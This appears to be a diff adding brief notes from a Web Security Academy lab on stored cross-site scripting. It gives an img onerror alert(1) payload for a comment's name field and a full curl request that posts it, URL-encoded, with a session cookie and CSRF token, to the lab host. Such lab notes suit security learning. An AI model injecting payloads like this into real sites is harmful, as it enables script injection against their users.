@@ -1,0 +1,11 @@
+
+name field:
+
+<><img src=1 onerror=alert(1)>
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0ad900ff0498ee0e807b6217005a00cc.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 167' -H $'Origin: https://0ad900ff0498ee0e807b6217005a00cc.web-security-academy.net' -H $'Referer: https://0ad900ff0498ee0e807b6217005a00cc.web-security-academy.net/post?postId=6' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=Xwzv6i1e72JbjB12BaRmt2xY5MExRFq4' \
+    --data-binary $'csrf=mebzUZDzdr1R2XEjgPYgfmF3ECYDti8U&postId=6&comment=test&name=%3C%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&email=test%40test.com&website=http%3A%2F%2Fwww.test.com' \
+    $'https://0ad900ff0498ee0e807b6217005a00cc.web-security-academy.net/post/comment'
